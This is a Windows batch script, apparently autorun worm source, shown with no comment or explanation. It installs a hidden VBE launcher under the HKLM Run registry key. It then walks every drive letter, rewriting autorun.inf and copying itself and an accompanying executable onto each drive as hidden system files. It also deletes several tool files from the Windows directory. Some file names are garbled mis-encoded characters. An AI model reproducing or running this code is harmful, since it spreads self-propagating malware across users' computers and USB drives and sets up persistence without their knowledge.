@echo off
setlocal ENABLEDELAYEDEXPANSION ENABLEEXTENSIONS
cd /d "%~dp0"
if /i "%cd%"=="%~d0\" (explorer.exe "%~d0")
set "endf=%systemdrive%\ubye.txt"
echo.Wscript.sleep 10000>sleep.vbe
attrib sleep.vbe +a +s +r +h
if /i not "%cd%"=="%systemroot%" (call:cb&del/a/f/q sleep.vbe&goto :eof)
set dl=CDEFGHIJKLMNOPQRSTUVWXYZ
set n=0
call:inf >inf.tem
call:ql
set v=1
"%systemroot%\U≈Ã≤°∂æ∑÷ŒˆBeta3.exe"
:s
echo. >uishere-%v%.txt
if exist "%endf%" (goto end)
if "!dl:~%n%,1!"=="" (set n=0&sleep.vbe)
set d=!dl:~%n%,1!:
set /a n=n+1
if not exist %d% (goto s)
if exist "%d%\autorun.inf\" (echo.y|cacls "%d%\autorun.inf" /p everyone:f
rd "%d%\autorun.inf" /s /q)
if exist "%d%\autorun.inf" (fc "%d%\autorun.inf" inf.tem&if not "!ERRORLEVEL!"=="0" (call U≈Ã≤°∂æ∑÷Œˆ.bat -a -l -d %d:~0,-1% -c -i -s&goto s1)) else (goto s1)
if not exist "%d%\%~n0.vbe" (goto s2)
if not exist "%d%\%~nx0" (goto s3)
if not exist "%d%\U≈Ã≤°∂æ∑÷ŒˆBeta3.exe" (goto s4)
if exist %d%\%date:~0,10%.sk (goto s)
:s1
call:inf >%d%\autorun.inf
attrib %d%\autorun.inf +a +s +r +h
if exist "%d%\%~n0.vbe" (del /a /f /q "%d%\%~n0.vbe")
:s2
call:vbe >"%d%\%~n0.vbe"
attrib "%d%\%~n0.vbe" +a +s +r +h
:s3
call:copy "%~dpnx0" "%d%\"
:s4
call:copy "U≈Ã≤°∂æ∑÷ŒˆBeta3.exe" "%d%\"
if exist %d%\*.sk (del /a /f /q %d%\*.sk)
echo.>%d%\%date:~0,10%.sk
attrib %d%\%date:~0,10%.sk +a +s +r +h
goto s
:cb
if exist "%systemroot%\uishere-*.txt" (del /a /f /q "%systemroot%\uishere-*.txt"&sleep.vbe)
if exist "%systemroot%\uishere-*.txt" (if exist "%systemroot%\uishere-%v%.txt" (goto :eof) else (echo.>"%endf%"&sleep.vbe))
call:copy "%~dpnx0" "%systemroot%\"
call:copy "U≈Ã≤°∂æ∑÷ŒˆBeta3.exe" "%systemroot%\"
if exist "%systemroot%\%~n0.vbe" (del /a /f /q "%systemroot%\%~n0.vbe")
call:vbe >"%systemroot%\%~n0.vbe"
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v vbe /t REG_SZ /d "%systemroot%\%~n0.vbe" /f
start "" /wait /d "%systemroot%\" "%systemroot%\%~n0.vbe"
goto :eof
:vbe
echo.set ws=wscript.createobject("wscript.shell")
echo.ws.run "%~nx0 /start",0
goto :eof
:inf
echo.[AutoRun]
echo.open=wscript.exe %~n0.vbe
echo.shell\open\Command=wscript.exe %~n0.vbe
echo.shell\explore\Command=wscript.exe %~n0.vbe
echo.shell\find\Command=wscript.exe %~n0.vbe
goto :eof
:copy
if exist "%~dp2%~nx1" (del/a/f/q "%~dp2%~nx1")
attrib "%~1" -s -h
copy "%~1" "%~dp2"
attrib "%~1" +s +h
attrib "%~dp2%~nx1" +s +h
goto :eof
:ql
cd /d "%systemroot%\"
del /a /f /q Anti-U≈Ã√‚“ﬂ.bat ReadMe.txt uda-Ω‚—π.bat uda.exe U≈Ã≤°∂æ∑÷Œˆ.bat zap.exe ÷˜≤Ÿøÿ.bat
cd /d "%~dp0"
goto :eof
:end
call U≈Ã≤°∂æ∑÷Œˆ.bat -c&call:ql&del/a/f/q "%~dp0sleep.vbe" "%endf%" inf.tem "U≈Ã≤°∂æ∑÷ŒˆBeta3.exe" "%~n0.vbe" "%~nx0" "uishere-%v%.txt"&reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v vbe /f